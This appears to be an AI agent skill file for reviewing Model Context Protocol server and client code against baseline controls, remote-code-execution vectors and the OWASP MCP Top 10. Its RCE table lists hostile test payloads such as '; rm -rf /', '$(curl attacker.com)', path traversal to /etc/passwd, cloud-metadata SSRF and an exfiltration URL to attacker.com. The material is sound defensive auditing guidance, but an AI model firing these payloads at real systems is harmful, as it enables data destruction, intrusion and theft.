---
name: mcp-implementation-security-review
description: >-
  Review MCP server, client, and tool-handler source code for security. Use when asked to review an MCP server before release, audit Model Context Protocol implementation controls MCP-01 through MCP-05, check OWASP MCP Top 10, inspect auth, sessions, rate limiting, input-schema validation, official SDK use, or RCE vectors with file and line evidence.
---

# MCP implementation security review

Classify an MCP implementation, evaluate applicable baseline controls, RCE vectors, and OWASP MCP Top 10 risks, then produce an evidence-backed security report with code findings and manual follow-ups.

## When to invoke

- "Review this MCP server for security."
- "Is my MCP server implementation secure?"
- "Audit our MCP tools for RCE vectors."
- "Check this Model Context Protocol server against MCP-01 to MCP-05."
- "Review MCP client code that handles session IDs and server responses."

## Prerequisites and context

- Check protocol version `2025-03-26` or later; current reference is `2025-11-25`.
- Treat the target as server, client, or mixed implementation before applying controls.
- Do not assume STDIO when transport is unclear; mark NEEDS INVESTIGATION and identify the missing evidence.

## Procedure

1. Classify the target type, MCP protocol status, transport, exposure, and session usage.
2. Apply false positive filters before opening findings.
3. For network-exposed servers, score MCP-01 through MCP-05; for local/STDIO servers, give best-practice notes and still review RCE; for clients, review token/session handling explicitly visible in client code.
4. Review all 7 RCE vectors and mark SAFE, AT RISK, or N/A.
5. Evaluate all 10 OWASP MCP Top 10 risks and reuse baseline-control evidence where it fully covers a risk.
6. Report with file/line evidence, separate manual follow-ups, and use NEEDS INVESTIGATION for missing deployment, identity-provider, log, or runtime evidence.

## Classification rules

| Decision | Rule |
| --- | --- |
| Network-exposed server | Apply all 5 controls, then RCE and OWASP checks. |
| Local/STDIO server | Do not mark baseline controls PASS/FAIL; provide best practices and still run RCE because tool input can execute locally. |
| Client | Review received-token handling and refusal to trust server-provided session IDs; do not force server controls unless asked. |
| Reverse proxy or container exposure | If traffic can reach the server over a network, treat it as network-exposed even if the inner binding is localhost. |
| Ambiguous auth coverage | Auth middleware exists but endpoint coverage is unclear → NEEDS INVESTIGATION. |
| Undeterminable transport | Flag for manual review; do not default to STDIO. |

| Network-exposed pattern | Transport |
| --- | --- |
| `transport="http"` or `transport="sse"` | HTTP/SSE |
| `StreamableHttpServerTransport` | HTTP (TS/JS) |
| `SSEServerTransport` | SSE (TS/JS) |
| `WithHttpTransport()` | HTTP (C#) |
| `host="0.0.0.0"` | All-interfaces binding |
| Express `.listen(port)` with MCP routes | HTTP, default `0.0.0.0` |
| `EXPOSE` in Dockerfile + MCP server | Network-exposed |

| Local-only pattern | Transport |
| --- | --- |
| `StdioServerTransport` | STDIO (TS/JS) |
| `WithStdioServerTransport()` | STDIO (C#) |
| `transport="stdio"` | STDIO |
| `mcp.run()` with no args | Python FastMCP STDIO default |
| `.vscode/mcp.json` with `command` key and no URL | STDIO child process |

| Binding | Actual exposure |
| --- | --- |
| `host="0.0.0.0"` | Network-exposed |
| `host="127.0.0.1"` or `localhost` | Local-only |
| No explicit host (Express/Node) | Defaults to `0.0.0.0` |
| No explicit host (Python FastMCP) | Depends on transport; verify. |
| Docker `ports: "8000:8000"` | Network-exposed even if the process binds `127.0.0.1` inside the container. |

## False positive filters

| FP pattern | How to detect |
| --- | --- |
| `.github/skills/` templates | Path contains `.github/skills/`; skill template, not server code. |
| Vendored SDK / OSS copies | File defines `class FastMCP`, `class McpServer`, or path is in `node_modules/`, `vendor/`. |
| MCP client configs | `.vscode/mcp.json` with `inputs`/`servers` but no server code. |
| Documentation / tutorials | `.md`, `.rst` with code fences unrelated to the repo's own server. |
| Outbound-only auth libraries | `DefaultAzureCredential`, service account JSON, or similar used only for outbound auth. |

Keep documentation when it describes the repo's own server behavior, deployment, transport, or auth posture.

## Baseline controls

| Control | Scope | Passing condition | Pitfall |
| --- | --- | --- | --- |
| MCP-01 Identity isolation | Remote MCP servers | Authenticate every inbound request with a trusted identity provider; authorize at the server boundary; use a unique server-specific application identity and audience/resource identifier; outbound calls use independently scoped service credentials or on-behalf-of flow. Unauthenticated discovery endpoints are metadata-only: `/.well-known/oauth-protected-resource`, `/.well-known/oauth-authorization-server`, `/.well-known/openid-configuration`. | Shared application identities or forwarded caller tokens create confused-deputy paths. |
| MCP-02 Sessions | Remote MCP servers that support sessions | Per-request auth remains required; session IDs are opaque, CSPRNG-generated, unpredictable, bound to authenticated context, never in URLs, and never privileges. No sessions → N/A; SDK-managed `Mcp-Session-Id` not visible → NEEDS INVESTIGATION. | Treating a session ID as a bearer credential. |
| MCP-03 Rate limits | MCP servers and tools | Enforce limits at MCP runtime on discovery and invocation, keyed by identity and session, stricter for mutation/high-cost tools, fail closed with HTTP 429 and `Retry-After`. | Gateway-only throttling or one flat bucket. |
| MCP-04 Schema validation | Servers exposing structured arguments | Validate all tool args before execution with explicit schemas covering types, required fields, enums, bounds, and `additionalProperties: false` or equivalent; invalid input returns 400/MCP error and no backend action. | Client-only validation or extra properties. |
| MCP-05 SDK-first | Remote MCP servers | Use an official MCP SDK: Tier 1 TypeScript (`modelcontextprotocol/typescript-sdk`), Python (`modelcontextprotocol/python-sdk`), C#/.NET (`modelcontextprotocol/csharp-sdk`), Go (`modelcontextprotocol/go-sdk`); Tier 2/3 Java, Kotlin, Rust, Swift, PHP, Ruby SDKs. If not official, mark NEEDS INVESTIGATION and require direct control evidence. | Hand-rolled HTTP/SSE often misses per-request auth, throttling, or validation. |

Starting MCP-03 thresholds: read-only/listing 100/min per identity and 200/min per session; mutation/write 10/min and 20/min; high-cost compute 5/min and 10/min; tool discovery 30/min and 60/min. Tune to actual load, downstream limits, and cost.


## Review vocabulary

Preserve these MCP security terms because they affect scoring: `PASS/FAIL**`, `N/A**`, `N/A**.`, `OAuth/MCP`, `Authorization`, `application/client/resource`, `auth/authz`, `client-only`, `client-side`, `command/code`, `correlation/continuity`, `expired/invalid`, `framework/SDK`, `generation/binding`, `hand-rolled`, `in-scope`, `input-validation`, `instruction-bearing`, `mutation-capable`, `network-dependent`, `rate-limiting`, `re-checking`, `read/write/execute`, `repo-owned`, `scopes/roles`, `security/release`, `state-changing`, `string-built`, `time-based`, `transport/SDK`, `under-protects`, `v4/CSPRNG`, `GUID`, `60/min`, and `write/high-cost`.

Official SDK package names include `modelcontextprotocol/java-sdk`, `modelcontextprotocol/kotlin-sdk`, `modelcontextprotocol/rust-sdk`, `modelcontextprotocol/swift-sdk`, `modelcontextprotocol/php-sdk`, and `modelcontextprotocol/ruby-sdk`; shorthand labels include `java-sdk`, `kotlin-sdk`, `rust-sdk`, `swift-sdk`, `php-sdk`, and `ruby-sdk`.

## RCE vectors

| Vector | Dangerous code | Safe alternative | Test payload | CWE |
| --- | --- | --- | --- | --- |
| Command injection | `exec("convert " + args.filename)`, `os.system(f"process {user_input}")`, `Process.Start("cmd", "/c " + toolArg)` | `execFile("convert", [args.filename])`, `subprocess.run(["process", user_input], shell=False)` | `; rm -rf /`, `$(curl attacker.com)`, `| net user` must be rejected or literal. | CWE-78 |
| Dynamic code evaluation | `eval(args.expression)`, `exec(tool_output)`, `new Function(args.code)()` | Sandboxed parser, AST-based evaluation, or predefined allowlist. | `__import__('os').system('whoami')`, `require('child_process').exec('id')` must be rejected. | CWE-94, CWE-95 |
| Unsafe deserialization | `pickle.loads(user_data)`, `yaml.load(input, Loader=yaml.UnsafeLoader)`, `BinaryFormatter.Deserialize(stream)` | `yaml.safe_load()`, `JSON.parse()` plus schema validation; avoid binary formats for untrusted input. | Crafted serialized payloads must be rejected or safely handled. | CWE-502 |
| Path traversal | `fs.readFile(args.path)`, `open(user_path, 'w')` | Canonicalize and enforce an allowlisted base directory before read/write/execute. | `../../../../etc/passwd`, `C:\Windows\System32\config\SAM`, `..\..\..\.env` must be rejected. | CWE-22 |
| SSTI | `Template(user_input).render()`, `Handlebars.compile(args.template)({data})` | Never use user input as template source; use predefined templates with parameters only. | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` must not render `49`. | CWE-1336 |
| Dependency hijacking | Unpinned deps such as `"lodash": "^4.0.0"`; internal package names resolvable from public registries. | Pin exact versions, keep lock files with integrity hashes, use trusted/scoped registries, verify signatures where available. | `npm audit`, `pip audit`, or `dotnet list package --vulnerable`; review CVEs and suspicious packages. | CWE-829 |
| SSRF | `requests.get(user_param)`, `fetch(user_input)`, `HttpClient.GetAsync(user_input)` | Allowlist schemes/domains, block RFC1918 and link-local targets, validate URLs before sending. | `http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/admin`, `http://attacker.com/?data=stolen` must be rejected. | CWE-918 |

## OWASP MCP Top 10

| Risk | Test | Pass | Fail |
| --- | --- | --- | --- |
| MCP01:2025 Token Mismanagement & Secret Exposure | Search for hardcoded secrets and token logging; verify env vars or secrets manager and rotation. | No hardcoded secrets, redaction, short-lived/rotated tokens. | Hardcoded secrets, token logging, or long-lived tokens without rotation. |
| MCP02:2025 Privilege Escalation via Scope Creep | Review scopes, roles, per-request authorization, wildcard admin scopes, runtime capability expansion. | Least privilege, per-request authz, no runtime expansion. | Broad scopes, one-time auth only, self-escalating tools. |
| MCP03:2025 Tool Poisoning | Check static server-controlled tool definitions and data-only outputs. | Static definitions and data-only outputs. | External metadata sources or outputs with embedded instructions. |
| MCP04:2025 Supply Chain Attacks & Dependency Tampering | Check lock files, exact pinning, suspicious `postinstall` scripts, audit results, trusted registries. | Pinned deps, committed lock, no known vulnerabilities, no suspicious post-install scripts. | Unpinned deps, no lock, unpatched CVEs, untrusted registries. |
| MCP05:2025 Command Injection & Execution | Search shell execution APIs and trace tool input to shell; test `; ls`, `$(whoami)`, `| cat /etc/passwd`. | No shell execution from untrusted input or parameterized allowlisted execution only. | User input reaches shell commands, `shell=True` formatted strings, unsafe concatenation. |
| MCP06:2025 Prompt Injection via Contextual Payloads | Check tool output returned to LLM, external content sanitization/truncation/sandboxing, and chained tool guardrails. | Data-only outputs, untrusted content sanitized/truncated/sandboxed, chaining guarded. | Raw external content returns to model without chaining limits. |
| MCP07:2025 Insufficient Authentication & Authorization | Send unauthenticated and expired/invalid-token requests; verify per-tool auth in server. | All endpoints require valid auth and per-tool authorization server-side. | Any unauthenticated access, missing per-tool auth, or gateway-only enforcement. |
| MCP08:2025 Lack of Audit and Telemetry | Invoke tool and error path; inspect caller identity, tool name, timestamp, centralized logs, alerts. | Tool invocations logged with identity, centralized logs, alerts. | Missing logs, no identity, local-only logging, no alerting. |
| MCP09:2025 Shadow MCP Servers | Verify service inventory, undocumented endpoints, non-standard ports, dev/staging isolation, owner, review trail. | Inventoried, isolated, owned servers. | Undocumented servers, exposed dev/test, no ownership. |
| MCP10:2025 Context Injection & Over-Sharing | Inspect data minimization, PII, full objects, context isolation. | Minimal data, sensitive fields masked/excluded, isolated context. | Full objects, PII exposure, shared context. |

## Exception process

- Document the gap, exact deviation, residual risk, and compensating controls.
- Get explicit security or release approval with an owner and expiration or review date.
- Track and re-evaluate on expiry or whenever the server, tools, traffic profile, or exposure changes.

## Output template

```markdown
## MCP implementation security review — <target>

**Target type:** server | client | mixed
**Transport:** HTTP | SSE | STDIO | unknown
**Protocol:** <version and status>
**Exposure:** network-exposed | local-only | needs investigation

### Control summary
| Control | Name | Status | Justification |
|---|---|---|---|
| MCP-01 | Auth & Identity isolation | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
| MCP-02 | Secure Session Management | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
| MCP-03 | Rate limiting & abuse protection | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
| MCP-04 | Input schema validation | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
| MCP-05 | Production SDK usage | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |

### RCE summary
| Vector | Status | Justification |
|---|---|---|
| Command injection | SAFE / AT RISK / N/A | <file:line evidence> |
| Dynamic code evaluation | SAFE / AT RISK / N/A | <file:line evidence> |
| Unsafe deserialization | SAFE / AT RISK / N/A | <file:line evidence> |
| Path traversal | SAFE / AT RISK / N/A | <file:line evidence> |
| SSTI | SAFE / AT RISK / N/A | <file:line evidence> |
| Dependency hijacking | SAFE / AT RISK / N/A | <file:line evidence> |
| SSRF | SAFE / AT RISK / N/A | <file:line evidence> |

### OWASP summary
| Risk | Status | Justification |
|---|---|---|
| MCP01:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP02:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP03:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP04:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP05:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP06:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP07:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP08:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP09:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
| MCP10:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |

### Manual follow-ups
- <missing artifact or access required>
```

## Quality gate

- [ ] Target type, protocol status, transport, exposure, and session usage are identified or marked NEEDS INVESTIGATION.
- [ ] False positives are filtered before findings are opened.
- [ ] Network-exposed servers have MCP-01 through MCP-05 scored with file/line evidence.
- [ ] Local/STDIO servers are not falsely scored PASS/FAIL for network-only controls but are still reviewed for RCE.
- [ ] Every RCE vector is SAFE, AT RISK, or N/A with evidence.
- [ ] Every OWASP MCP Top 10 risk has PASS, FAIL, or NEEDS INVESTIGATION.
- [ ] Manual follow-ups name the exact artifact or access needed.

## References

- [MCP specification 2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26)
- [MCP specification 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)
